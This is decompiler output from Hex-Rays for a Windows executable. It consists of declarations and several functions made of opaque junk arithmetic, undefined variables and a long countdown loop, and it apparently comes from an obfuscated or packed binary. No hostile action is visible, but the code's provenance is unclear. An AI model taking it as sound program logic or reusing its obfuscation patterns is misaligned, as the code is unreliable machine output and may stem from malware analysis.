/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// int __userpurge sub_401545@<eax>(int a1@<eax>, int a2@<ecx>, int a3, int a4);
int __stdcall sub_401779(int a1, int a2);
// int __userpurge sub_4019A8@<eax>(__int16 a1@<ax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4);
int __stdcall sub_401A03(int a1);
unsigned int __stdcall sub_401BE4(int a1, int a2, int a3);
// int __usercall start@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
// int __userpurge sub_4020D6@<eax>(int result@<eax>, __int16 a2@<cx>, int a3, int a4, int a5);
int __stdcall sub_402272(int a1, int a2, int a3);
// int __userpurge sub_402463@<eax>(__int16 a1@<di>, int a2, int a3, int a4);
int __fastcall sub_402B35(int a1, int a2);
int __fastcall sub_402D78(unsigned int a1, int a2, int a3, int a4, int a5);
int __thiscall sub_402F82(void *this, int a2, int a3, int a4);
// int __userpurge sub_40300C@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5);
// void __usercall sub_403247(unsigned int a1@<edx>, unsigned int a2@<ecx>, int a3@<ebp>, int a4@<esi>);
// int __userpurge sub_403BE5@<eax>(int a1@<eax>, int a2, int a3);
int __fastcall sub_403D10(int a1, int a2, int a3, int a4, int a5);
// void __usercall sub_404030(unsigned int a1@<edx>, unsigned int a2@<ecx>, int a3@<esi>);
int sub_4056EC();
int __cdecl sub_405720(int a1);
// int (__fastcall *__usercall sub_405E59@<eax>(unsigned int a1@<edx>, int a2@<ebx>))(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// void __usercall sub_405E95(unsigned int a1@<ecx>, int a2@<ebx>, void *a3@<edi>, const void *a4@<esi>);
// unsigned int __usercall sub_4061E7@<eax>(int a1@<edx>, int a2@<esi>);
int (__fastcall *sub_4062CA())(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// int __usercall sub_406516@<eax>(__int16 a1@<di>);
unsigned __int8 __cdecl sub_4068C3(_BYTE *a1, unsigned int a2, int a3);
__int64 __cdecl sub_407231(__int64 a1);
// int __userpurge sub_40787F@<eax>(bool a1@<cf>, unsigned int a2@<eax>, unsigned int a3@<edx>, unsigned int *a4@<ecx>, _DWORD *a5@<ebp>, unsigned int a6@<edi>, int a7@<esi>, int a8, int a9, int a10);
int __cdecl sub_407C17(int a1, int a2, unsigned __int8 *a3);
_DWORD sub_407F6E(); // weak
void sub_408057();
// void __usercall sub_40A8C7(char a1@<al>, __int16 a2@<dx>, int a3@<ebx>, int a4@<ebp>, int _ESI@<esi>);
// int __usercall sub_40D45E@<eax>(char a1@<cl>, int a2@<esi>);
// void __usercall sub_439ABB(int a1@<eax>, int a2@<edi>, int a3@<esi>);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HANDLE __stdcall GetCurrentProcess();
// DWORD __stdcall GetCurrentProcessId();
// HANDLE __stdcall GetCurrentThread();
// PVOID __stdcall FreeSid(PSID pSid);
// LSTATUS __stdcall RegEnumValueA(HKEY hKey, DWORD dwIndex, LPSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_40685F; // weak
_UNKNOWN unk_4208EB; // weak
_UNKNOWN unk_4209EB; // weak
int dword_439004 = 0; // weak
int dword_439008 = 0; // weak
int dword_43900C = 0; // weak
int dword_439010 = 0; // weak
int dword_439014 = 0; // weak
int dword_439018 = 0; // weak
int dword_43901C = 0; // weak
int dword_439020 = 0; // weak
int dword_439024 = 0; // weak
int dword_439028 = 0; // weak
int dword_43902C = 0; // weak
int dword_439030 = 0; // weak
int dword_439034 = 0; // weak
int dword_439038 = 0; // weak
int dword_43903C = 0; // weak
int dword_439040 = 0; // weak
int dword_439044 = 0; // weak
int dword_439048 = 0; // weak
int dword_43904C = 0; // weak
int dword_43913C = 0; // weak
int dword_439270 = 0; // weak
int dword_4392F0 = 0; // weak
int dword_439328 = 0; // weak
char byte_4393D4 = '\0'; // weak
int dword_4394A8 = 0; // weak
char byte_43961C = 'È'; // weak
int dword_43965C = -1929379821; // weak
_UNKNOWN dword_4396E8; // weak
int dword_43970C = 17111; // weak
int dword_4397A8 = -1014956032; // weak
_UNKNOWN loc_439870; // weak
int dword_439894 = -1406200437; // weak
int dword_439914 = 16777223; // weak
char byte_4399B4 = 'd'; // weak
int dword_439AA8 = -746340303; // weak
int dword_439B80 = 733020227; // weak
int dword_439C40 = 905963048; // weak
char byte_439CE4 = 'E'; // weak
char byte_439F68 = '@'; // weak
char byte_439F8C = '\0'; // weak
int dword_43A1B8 = -2147483589; // weak
int dword_43A238 = -2083812991; // weak
_UNKNOWN byte_43A298; // weak
int dword_43A2D8 = 403031808; // weak
char byte_43A2FC = '\x01'; // weak
int dword_43A304 = -1090501744; // weak
int dword_43A3E4 = 1307819987; // weak
int dword_43A404 = 1209346304; // weak
char byte_43A4B0 = 'è'; // weak
_UNKNOWN loc_43A515; // weak
int dword_43A58C = -396343925; // weak
int dword_43A678 = -25052976; // weak
_UNKNOWN loc_43A6DE; // weak
char byte_43A854 = '\x15'; // weak
_UNKNOWN dword_43A878; // weak
char byte_43A888 = '\0'; // weak
int dword_43A988 = -1146430975; // weak
int *off_43AAA4 = &dword_43AC33; // weak
int dword_43AAD4 = 0; // weak
int dword_43AAD8 = 2022227134; // weak
int dword_43AADC = 0; // weak
int (__thiscall *dword_43AAE0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43AAE4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43AAE8 = 0; // weak
_UNKNOWN dword_43AAEC; // weak
_UNKNOWN byte_43AAF0; // weak
char byte_43AB00 = '\0'; // weak
int dword_43AC03 = 0; // weak
int dword_43AC07 = 0; // weak
int dword_43AC17 = 521288629; // weak
int (__fastcall *dword_43AC1B)(_DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43AC27)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43AC2B; // weak
_DWORD dword_43AC37 = 0; // idb
int dword_43AC3B = 88675123; // weak
int dword_43AC3F = 362436069; // weak
int dword_43AC43 = 0; // weak
int (__fastcall *dword_43AC4B)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_DWORD dword_43AC4F = 0; // idb
int (__fastcall *dword_43AC53)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43AC57 = 190074; // weak
int (__fastcall *dword_43AC63)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43AC67; // weak
int dword_43AC7D = 70000; // weak
int (__fastcall *dword_43AC81)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43AC89)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_DWORD dword_43AC8D[11] = { 0, 1743706808, -495799615, -703378025, -1396795189, 0, 0, 0, 0, 0, 0 }; // idb


//----- (00401545) --------------------------------------------------------
int __userpurge sub_401545@<eax>(int a1@<eax>, int a2@<ecx>, int a3, int a4)
{
  int v4; // edx
  unsigned int v5; // ecx
  int v7; // [esp+4h] [ebp-140h]
  char v8[20]; // [esp+10h] [ebp-134h] BYREF
  char v9[40]; // [esp+24h] [ebp-120h] BYREF
  int v10; // [esp+7Ch] [ebp-C8h]
  int v11; // [esp+A0h] [ebp-A4h]
  char v12[32]; // [esp+F8h] [ebp-4Ch] BYREF
  int v13; // [esp+140h] [ebp-4h]

  v11 ^= v7 + sub_401779(a2, a1) + 3798;
  v10 += sub_402D78(v5, v4, 55, 30, 0);
  sub_402F82(v12, (int)v12, 0, (int)v8);
  return sub_40300C((int)v9, (int)v9, v13, (int)v9, 0);
}
// 401555: variable 'v7' is possibly undefined
// 401591: variable 'v5' is possibly undefined
// 401591: variable 'v4' is possibly undefined

//----- (00401779) --------------------------------------------------------
int __stdcall sub_401779(int a1, int a2)
{
  int result; // eax
  unsigned __int16 v3; // [esp+2ACh] [ebp-7Ch]
  __int16 v4; // [esp+2FCh] [ebp-2Ch]

  result = v3;
  if ( (v3 & 0x3A72) == 0 )
    result = (((unsigned __int16)(v4 & v3) ^ 0x3293) + 4357) & 0x16C8 ^ 0x3157;
  return result;
}
// 403DBA: variable 'v3' is possibly undefined
// 403DC9: variable 'v4' is possibly undefined

//----- (004019A8) --------------------------------------------------------
int __userpurge sub_4019A8@<eax>(__int16 a1@<ax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4)
{
  unsigned __int16 v4; // ax
  unsigned int v5; // eax
  int v7; // edx
  int v8; // ecx
  void *v9; // ecx
  int v10; // eax
  char v11[4]; // [esp+24h] [ebp-388h] BYREF
  int v12; // [esp+28h] [ebp-384h]
  char v13[148]; // [esp+88h] [ebp-324h] BYREF
  unsigned __int16 v14; // [esp+1C8h] [ebp-1E4h]
  char v15[140]; // [esp+2A8h] [ebp-104h] BYREF

  v5 = (a1 + 12732) & 0x1D90;
  if ( a2 < v5 )
    goto LABEL_4;
  v4 = v14;
  if ( (v14 & 0x37F9) == 0 && v14 <= a3 )
  {
    LOWORD(v5) = 298;
LABEL_4:
    v4 = (v5 & 0x1A9) - 2165;
  }
  v12 -= __CFADD__(v4 & 0x1703, 2530) + (v4 & 0x1703) + 2530;
  sub_401A03(21);
  sub_402F82(v9, (int)v15, 0, (int)v11);
  v10 = sub_401A03(39) + 18399;
  sub_40300C(v10, v10, 454545578, (int)v13, 0);
  return sub_403D10(v8, v7, 0, 29, -1021541358) - 620;
}
// 402F42: variable 'v9' is possibly undefined
// 4025EB: variable 'v8' is possibly undefined
// 4025EB: variable 'v7' is possibly undefined

//----- (00401A03) --------------------------------------------------------
int __stdcall sub_401A03(int a1)
{
  int result; // eax
  int v2; // [esp+14h] [ebp-14Ch]
  unsigned __int8 v3; // [esp+18h] [ebp-148h]
  int v4; // [esp+38h] [ebp-128h]
  unsigned __int16 v5; // [esp+130h] [ebp-30h]

  if ( v4 != (v3 ^ 0x253F) || (result = 0, !v2) )
    result = v5 ^ 0x3278 | 0x3622;
  return result;
}
// 401109: variable 'v4' is possibly undefined
// 4023B2: variable 'v3' is possibly undefined
// 401125: variable 'v2' is possibly undefined
// 4049EB: variable 'v5' is possibly undefined

//----- (00401BE4) --------------------------------------------------------
unsigned int __stdcall sub_401BE4(int a1, int a2, int a3)
{
  int v3; // edx
  int v4; // ecx
  unsigned int v5; // eax
  int v6; // eax
  char v7; // cf
  unsigned int result; // eax
  __int16 v9; // [esp+24h] [ebp-2E8h]
  unsigned __int16 v10; // [esp+158h] [ebp-1B4h]
  unsigned __int8 v11; // [esp+264h] [ebp-A8h]
  unsigned int v12; // [esp+2B4h] [ebp-58h]

  sub_401A03(30);
  if ( (v4 & 0x12C4) != 0 || ((__CFADD__(v11, 8715) + v11 + 8715 + 8347) & v4) != 0 || v3 || v9 != 10547 )
  {
    v7 = 0;
    v6 = v10;
  }
  else
  {
    v6 = 7863;
    v7 = 1;
  }
  v5 = (__PAIR64__(v6 - ((unsigned int)v7 + 2596), v6) - (((unsigned int)v7 + 2596) | 0x26FC00000000i64)) >> 32;
  result = ((__CFADD__(v5 < 0x151D, v5 - 5405) | __CFADD__((v5 < 0x151D) + v5 - 5405, 5211))
          + (v5 < 0x151D)
          + (_WORD)v5
          - 5405
          + 5211
          + 11375) & 0xF71;
  if ( !v3 )
    result = (__PAIR64__(result, v12) - (result | 0x20DE00000000i64)) >> 32;
  return result;
}
// 402862: conditional instruction was optimized away because of 'edx.4==0'
// 402C97: variable 'v11' is possibly undefined
// 40261B: variable 'v4' is possibly undefined
// 40262A: variable 'v3' is possibly undefined
// 4014A7: variable 'v9' is possibly undefined
// 405077: variable 'v12' is possibly undefined
// 405198: variable 'v10' is possibly undefined

//----- (00401E4E) --------------------------------------------------------
int __usercall start@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int v4; // eax
  int v5; // edx
  int v6; // ecx
  int v7; // eax
  unsigned __int16 v8; // ax
  int v9; // ecx
  int v10; // eax
  int v11; // eax
  int v12; // edx
  int v13; // eax
  int v14; // eax
  unsigned int v15; // eax
  int v16; // edx
  unsigned int v17; // ecx
  unsigned int v18; // eax
  char *v19; // esi
  __int16 v20; // cx
  void *v21; // ecx
  int v22; // edx
  int v23; // eax
  int v24; // ecx
  int v25; // edx
  unsigned int v26; // eax
  int v27; // ecx
  int v29; // eax
  int v30; // ecx
  int v31; // edx
  char v32; // cf
  __int16 v33; // ax
  unsigned int v34; // ecx
  int v35; // ecx
  unsigned int v36; // ecx
  int v37; // eax
  int v38; // edx
  int v39; // eax
  __int16 v40; // cx
  int v41; // eax
  unsigned int v42; // edx
  unsigned int v43; // ecx
  int v44; // edx
  int v45; // edx
  int v46; // ecx
  int v47; // eax
  int v48; // eax
  int v49; // eax
  int v50; // ecx
  int v51; // ecx
  int v52; // edx
  unsigned int v53; // ecx
  int v54; // edx
  int v55; // ecx
  int v56; // eax
  int v57; // [esp-4h] [ebp-2C8h]
  int v58; // [esp-4h] [ebp-2C8h]
  char v59[8]; // [esp+34h] [ebp-290h] BYREF
  char v60[16]; // [esp+3Ch] [ebp-288h] BYREF
  int v61; // [esp+5Ch] [ebp-268h]
  int v62; // [esp+68h] [ebp-25Ch]
  char v63[4]; // [esp+6Ch] [ebp-258h] BYREF
  char v64[40]; // [esp+70h] [ebp-254h] BYREF
  int v65; // [esp+98h] [ebp-22Ch]
  int v66; // [esp+A0h] [ebp-224h]
  char v67[4]; // [esp+D4h] [ebp-1F0h] BYREF
  char v68[12]; // [esp+D8h] [ebp-1ECh] BYREF
  __int16 v69; // [esp+E4h] [ebp-1E0h]
  char v70[4]; // [esp+E8h] [ebp-1DCh] BYREF
  int v71; // [esp+ECh] [ebp-1D8h]
  int v72; // [esp+F4h] [ebp-1D0h]
  int v73; // [esp+108h] [ebp-1BCh]
  char v74[4]; // [esp+114h] [ebp-1B0h] BYREF
  int v75[2]; // [esp+118h] [ebp-1ACh] BYREF
  char v76[4]; // [esp+13Ch] [ebp-188h] BYREF
  int v77; // [esp+140h] [ebp-184h]
  char v78[4]; // [esp+15Ch] [ebp-168h] BYREF
  int v79; // [esp+17Ch] [ebp-148h]
  int v80[2]; // [esp+1A8h] [ebp-11Ch] BYREF
  char v81[16]; // [esp+1B0h] [ebp-114h] BYREF
  unsigned int v82; // [esp+1C0h] [ebp-104h]
  int v83; // [esp+1CCh] [ebp-F8h]
  int v84[3]; // [esp+1D8h] [ebp-ECh] BYREF
  int v85; // [esp+1ECh] [ebp-D8h]
  int v86[5]; // [esp+1F0h] [ebp-D4h] BYREF
  int v87; // [esp+218h] [ebp-ACh]
  int v88; // [esp+224h] [ebp-A0h]
  int v89; // [esp+23Ch] [ebp-88h]
  int v90; // [esp+240h] [ebp-84h]
  int v91[4]; // [esp+24Ch] [ebp-78h] BYREF
  int v92; // [esp+25Ch] [ebp-68h]
  int v93; // [esp+264h] [ebp-60h]
  int v94; // [esp+268h] [ebp-5Ch]
  int v95; // [esp+27Ch] [ebp-48h]
  int v96; // [esp+28Ch] [ebp-38h]
  int v97; // [esp+294h] [ebp-30h]
  int savedregs; // [esp+2C4h] [ebp+0h] BYREF

  v23 = sub_40300C(a1, a1, 438973428, (int)v59, 0);
  sub_402272(v24, v23, 0);
  unk_43AC2B = v25;
  v26 = (unsigned int)&dword_43AC4F;
  dword_43AC4F = a4;
  LOBYTE(v26) = byte_4399B4 + (unsigned __int8)&dword_43AC4F;
  dword_43900C -= 18833;
  v26 += 2372;
  v32 = v26 & 1;
  v26 >>= 1;
  LOBYTE(v26) = -99;
  dword_43AC37 = a2;
  v19 = (char *)&dword_43AC37 + v32 + 23028;
  BYTE1(v26) -= byte_439CE4;
  dword_43AAD4 = a3;
  dword_43AC07 = v30;
  dword_439044 = 27894;
  dword_43901C += (v26 < dword_43970C) + 27751;
  dword_439038 = v26 - dword_43970C;
  dword_43AC8D[0] = &savedregs;
  v4 = sub_40300C(v26 - dword_43970C, v65, -1231347320, (int)v74, 0) + 13743;
  if ( v6 )
    goto LABEL_20;
  v7 = ((_WORD)v66 + (_WORD)v4 + 4089 - (__CFADD__(v4, 4089) + 12946)) & 0x3174;
  if ( v5 != v89 )
  {
LABEL_13:
    v83 -= v7 | 0x3680;
    goto LABEL_4;
  }
  v8 = v7 + 3851;
  if ( !v91[0] )
  {
    v4 = (((v8 | 0x1FA7) & 0x230) - 9749) & 0x2C21;
LABEL_20:
    v85 += v4;
    v7 = (unsigned __int16)(v94 & v69);
    goto LABEL_13;
  }
LABEL_4:
  v10 = sub_402B35(v6, v5);
  v92 -= (v32 + v10 + 11453) ^ 0x2F7E;
  sub_403D10(v9, 0, 0, 1, 58392206);
  sub_401BE4(0, 0, v97);
  sub_402F82(v21, (int)v81, 0, (int)v60);
  sub_401BE4(v22, 0, v80[0]);
  sub_401545((int)v84, v35, (int)v84, (int)v91);
  v37 = sub_402D78(v36, 0, 26, 45, 0);
  v39 = sub_403BE5(v37, v38, (int)v78);
  v41 = sub_4020D6(v39, v40, 2016605020, 9, 0);
  v93 |= v41;
  v18 = v41 ^ 0x1B9C | 0x1DD7;
  v88 -= v18;
  if ( (v18 & 0x1DD5) == 0 && v42 >= v18 )
    v86[0] |= v18;
  sub_402D78(v43, v42, 18, 46, 0);
  sub_402D78(v53, v52, 4, 14, 0);
  sub_402B35(v55, v54);
  v15 = sub_401BE4(0, 0, v84[0]);
  v29 = (v79 ^ v15) + 1686;
  v61 &= v29;
  if ( v82 >= v17 )
  {
    v29 = (v77 + __CFADD__(v84[0] ^ v29, 8793) + (unsigned __int16)v95) ^ 0x3BA7;
    if ( !v16 )
    {
      v29 += 102;
      v71 &= v29;
    }
  }
  sub_401779(-1064738323, v29);
  sub_403D10(v27, 0, 0, 1, 2134653967);
  v33 = sub_402463((__int16)dword_43AC8D, 26, 18, 0);
  v14 = ((v32 + v33 + 2089) & 0x39FE | 0x201) + 8554;
  if ( v14 != v62 )
    goto LABEL_16;
  v11 = -3604;
  if ( (v34 & 0x240A) == 0 )
  {
LABEL_26:
    v11 |= 0xAEAu;
    goto LABEL_9;
  }
  if ( (v34 & 0xFFFFF1EC) == 0 )
  {
    v14 = (unsigned __int16)v87 ^ 0x1666;
    v90 |= v14;
LABEL_16:
    v72 -= v14 ^ 0x200C;
    v11 = (v14 ^ 0x200C) - 12842;
    goto LABEL_26;
  }
LABEL_9:
  v73 -= (v11 - 1919) | 0x3596;
  sub_404030((unsigned int)v67, v34, (int)v19);
  sub_401A03(30);
  v56 = sub_402F82(v63, (int)v76, 0, (int)v63) ^ 0x3558;
  sub_402272(v56, v56, 0);
  v49 = sub_401A03(55);
  sub_4020D6(v49, v20, -514250780, 61, 0);
  v57 = ((sub_402F82(v86, (int)v70, 0, (int)v86) | 0x1704) - 9028) | 0x1D17;
  v47 = sub_403D10(v46, v45, 0, 1, v57);
  v62 -= v32 + v47;
  sub_402F82(v80, (int)v68, 0, (int)v80);
  sub_40300C((int)v75, v31, -1483147169, (int)v75, 0);
  v13 = (sub_401BE4(0, 0, v12) | 0x27D6) + 16052;
  v58 = sub_40300C(v13, v96, 890138604, (int)v64, 0) ^ 0x3F83;
  sub_403D10(v50, 0, 0, 31, v58);
  sub_401BE4(v51, 0, -811274231);
  v48 = sub_401A03(38);
  v75[0] -= v32 + v48;
  sub_401BE4(0, 0, v44);
  return (v69 & 0x10) + 5784;
}
// 40165D: conditional instruction was optimized away because of 'eax.4>=3596u'
// 401E70: variable 'v24' is possibly undefined
// 401E7B: variable 'v25' is possibly undefined
// 402B00: variable 'v30' is possibly undefined
// 401186: variable 'v6' is possibly undefined
// 4011A7: variable 'v5' is possibly undefined
// 401242: variable 'v32' is possibly undefined
// 4011FF: variable 'v9' is possibly undefined
// 401D32: variable 'v21' is possibly undefined
// 401D40: variable 'v22' is possibly undefined
// 403A35: variable 'v35' is possibly undefined
// 403A46: variable 'v36' is possibly undefined
// 403A53: variable 'v38' is possibly undefined
// 403A63: variable 'v40' is possibly undefined
// 40145F: variable 'v34' is possibly undefined
// 401A60: variable 'v20' is possibly undefined
// 4048C1: variable 'v46' is possibly undefined
// 4048C1: variable 'v45' is possibly undefined
// 402E19: variable 'v31' is possibly undefined
// 401485: variable 'v12' is possibly undefined
// 404D89: variable 'v50' is possibly undefined
// 404D9B: variable 'v51' is possibly undefined
// 40405D: variable 'v44' is possibly undefined
// 401F45: variable 'v27' is possibly undefined
// 4017F1: variable 'v17' is possibly undefined
// 4027A9: variable 'v16' is possibly undefined
// 40140A: variable 'v43' is possibly undefined
// 40140A: variable 'v42' is possibly undefined
// 404E5E: variable 'v53' is possibly undefined
// 404E5E: variable 'v52' is possibly undefined
// 404E68: variable 'v55' is possibly undefined
// 404E68: variable 'v54' is possibly undefined
// 43900C: using guessed type int dword_43900C;
// 43901C: using guessed type int dword_43901C;
// 439038: using guessed type int dword_439038;
// 439044: using guessed type int dword_439044;
// 43970C: using guessed type int dword_43970C;
// 4399B4: using guessed type char byte_4399B4;
// 439CE4: using guessed type char byte_439CE4;
// 43AAD4: using guessed type int dword_43AAD4;
// 43AC07: using guessed type int dword_43AC07;

//----- (004020D6) --------------------------------------------------------
int __userpurge sub_4020D6@<eax>(int result@<eax>, __int16 a2@<cx>, int a3, int a4, int a5)
{
  if ( (a2 & 0x33A8) != 0 )
    goto LABEL_5;
  if ( (a2 & 0xC1) == 0 )
  {
    result = 0;
LABEL_5:
    result = ((result | 0x236) - 11725) ^ 0x2D49;
  }
  return result;
}

//----- (00402272) --------------------------------------------------------
int __stdcall sub_402272(int a1, int a2, int a3)
{
  char v4; // [esp+DCh] [ebp-17Ch]

  return (v4 & 0x67 ^ 0x353F) + 9654;
}
// 401913: variable 'v4' is possibly undefined

//----- (00402463) --------------------------------------------------------
int __userpurge sub_402463@<eax>(__int16 a1@<di>, int a2, int a3, int a4)
{
  int v4; // eax
  unsigned int v5; // ecx
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  unsigned int v10; // ecx
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // edx
  int v16; // ecx
  int v17; // edx
  unsigned int v18; // ecx
  int v19; // eax
  unsigned int v20; // eax
  unsigned int v21; // edx
  unsigned int v22; // ecx
  int v23; // eax
  int v24; // edx
  __int16 v25; // ax
  int v26; // ecx
  int v27; // edx
  unsigned int v28; // ecx
  int v29; // edx
  unsigned int v30; // ecx
  int v31; // eax
  int v32; // ecx
  int v33; // ecx
  unsigned int v34; // eax
  int v35; // edx
  int v36; // edx
  unsigned __int16 v37; // ax
  int v38; // edx
  int v39; // ecx
  int v40; // eax
  int v41; // ecx
  int v42; // eax
  int v43; // ecx
  int result; // eax
  int v45; // eax
  int v46; // edx
  bool v47; // cf
  int v48; // eax
  __int16 v49; // dx
  bool v50; // cf
  bool v51; // cf
  int v52; // eax
  unsigned int v53; // eax
  int v54; // edx
  int v55; // edx
  unsigned int v56; // ecx
  int v57; // ecx
  int v58; // ecx
  int v59; // edx
  int v60; // edx
  int v61; // edx
  unsigned int v62; // ecx
  int v63; // [esp-180h] [ebp-184h]
  _BYTE v64[12]; // [esp-170h] [ebp-174h] BYREF
  int v65; // [esp-164h] [ebp-168h]
  unsigned __int8 v66; // [esp-160h] [ebp-164h]
  _BYTE v67[16]; // [esp-14Ch] [ebp-150h] BYREF
  int v68; // [esp-13Ch] [ebp-140h]
  int v69[4]; // [esp-128h] [ebp-12Ch] BYREF
  int v70; // [esp-118h] [ebp-11Ch]
  int v71; // [esp-110h] [ebp-114h]
  int v72; // [esp-FCh] [ebp-100h]
  unsigned int v73; // [esp-F4h] [ebp-F8h]
  int v74; // [esp-F0h] [ebp-F4h]
  int v75; // [esp-E0h] [ebp-E4h]
  _DWORD v76[7]; // [esp-DCh] [ebp-E0h] BYREF
  int v77; // [esp-C0h] [ebp-C4h]
  int v78; // [esp-B8h] [ebp-BCh]
  int v79; // [esp-A8h] [ebp-ACh]
  int v80; // [esp-A4h] [ebp-A8h]
  unsigned __int16 v81; // [esp-94h] [ebp-98h]
  int v82; // [esp-90h] [ebp-94h]
  int v83; // [esp-8Ch] [ebp-90h] BYREF
  _BYTE v84[20]; // [esp-88h] [ebp-8Ch] BYREF
  int v85; // [esp-74h] [ebp-78h]
  int v86; // [esp-64h] [ebp-68h]
  int v87; // [esp-60h] [ebp-64h]
  int v88; // [esp-5Ch] [ebp-60h]
  _BYTE v89[24]; // [esp-4Ch] [ebp-50h] BYREF
  int v90; // [esp-34h] [ebp-38h]
  int v91; // [esp-20h] [ebp-24h]
  int v92; // [esp-10h] [ebp-14h]
  int v93; // [esp-Ch] [ebp-10h]
  int v94; // [esp-8h] [ebp-Ch]
  int v95; // [esp-4h] [ebp-8h]

  sub_401A03(31);
  sub_402272(v69[2], v41, 0);
  v42 = sub_401A03(14);
  sub_401779(v42 - 12272, v43);
  sub_401BE4(0, 0, v77);
  sub_402272(v54, v69[1], 0);
  sub_402D78(v56, v55, 53, 9, 0);
  sub_402272(84613272, v71, 0);
  sub_401779(v46, v46);
  v85 += (v66 + 13131) ^ 0x2011;
  sub_402D78(v62, v61, 59, 7, 0);
  v19 = sub_402D78(v18, v17, 46, 53, 0) | 0x3BD9;
  v82 += v19;
  sub_402272(v19 & 0x14FF, v77, 0);
  sub_401A03(23);
  sub_401BE4(0, 0, v91);
  do
  {
    sub_406516(a1);
    sub_402272(11928835, v95, 0);
    sub_402D78(v28, v27, 61, 4, 0);
    v31 = sub_402D78(v30, v29, 21, 11, 0);
    v37 = sub_40300C((v31 - (v47 + 5197)) | 0x380, v36, 1552544740, (int)&v83, 0);
    v8 = (v37 | 0x2F6F) & 0xB97;
    if ( (v38 & v39) == 0 )
      v8 = (((_WORD)v8 + 9490) & 0x17E1) - 22688;
    v86 += ((v8 + 2428) | 0x3192) + 1676;
    sub_401A03(19);
    sub_402272(v35, v35, 0);
    v6 = sub_402D78(v5, 0, 5, 57, 0) & 0x1252;
    v63 = dword_43AC7D;
    v73 -= v6;
    v90 |= v6 - 11917;
    sub_401A03(28);
    v34 = sub_402272(1821047560, v33, 0);
    v74 += (v34 < 0xD19) + v34 - 3353 + 9637;
    v4 = sub_401779(15405, v70);
    v70 -= v47 + v4;
    sub_401A03(32);
    sub_402272(-499909658, -526886547, 0);
    v11 = sub_402D78(v10, v9, 11, 57, 0);
    v12 = v11 - v76[6];
    v65 += v12;
    v13 = ((unsigned __int16)sub_402272(v12, 0, 0) + 9803) & 0xE7B;
    v80 &= v13;
    sub_40300C(v68 + __CFADD__(v13, 6313) + v13 + 6313, 985393868, (int)v69, (int)v69, 0);
    sub_40300C((int)v64, v14, (int)v64, (int)v64, 0);
    dword_43AC7D = v63 - 1;
    v23 = sub_402272(v87, 0, 0);
    v79 -= v47 + v23;
    v25 = v23 + 30059;
    if ( (v24 & v26) == 0 )
      v68 += v25 & 0x1686;
    v20 = sub_402D78(0, v24, 2, 7, 0) + 23147;
    v93 &= v20;
    if ( v94 == v21 )
      goto LABEL_23;
    v40 = (v20 - 11300) ^ 0x2F7D;
    v45 = v40 - v75;
    v50 = v73 < v21;
    if ( v73 != v21 )
      goto LABEL_25;
    if ( (v21 & 0x1375) != 0 )
    {
      v51 = __CFADD__(v45, 8956);
      v52 = v45 + 8956;
      v45 = v51 + v52 + 11972;
      if ( v21 >= v22 )
      {
        v20 = (v84[4] | 0x77F) ^ 0x2A15;
LABEL_23:
        v47 = v20 < v73;
        v53 = v20 - v73;
        v92 -= v47 + v53;
        v45 = (((unsigned __int16)(v53 - 14020) | 0x1C09) ^ 0xA19) & 0x1183 ^ 0x39C4;
        v50 = 0;
LABEL_25:
        v45 += v50 + 5822;
        goto LABEL_7;
      }
    }
LABEL_7:
    sub_40300C(v45, v22, v88, (int)v84, 0);
    sub_401BE4(v57, 0, -339028435);
    sub_401BE4(0, 0, 1543754773);
    sub_40300C((int)v89, v58, (int)v89, (int)v89, 0);
    sub_40300C((int)v67, v59, v59, (int)v67, 0);
    sub_401A03(62);
    sub_401779(v60, 2024504796);
    sub_402272(-1573984308, 0, 0);
    sub_402272(0, v7, 0);
    sub_401A03(59);
    sub_401BE4(v16, 0, v15);
    sub_40300C(0, v78, (int)v76, (int)v76, 0);
    sub_401BE4(0, 0, -824298223);
    sub_402272(v32, 1586466218, 0);
    v48 = sub_401A03(30);
    v72 -= v47 + v48;
    HIBYTE(v49) -= byte_43A888;
  }
  while ( dword_43AC7D );
  result = v81;
  if ( (v49 & 0xECC) == 0 && !v81 )
    result = -13973;
  return result;
}
// 40357A: variable 'v41' is possibly undefined
// 403597: variable 'v43' is possibly undefined
// 404774: variable 'v54' is possibly undefined
// 404786: variable 'v56' is possibly undefined
// 404786: variable 'v55' is possibly undefined
// 403D97: variable 'v46' is possibly undefined
// 4050C5: variable 'v62' is possibly undefined
// 4050C5: variable 'v61' is possibly undefined
// 402237: variable 'v18' is possibly undefined
// 402237: variable 'v17' is possibly undefined
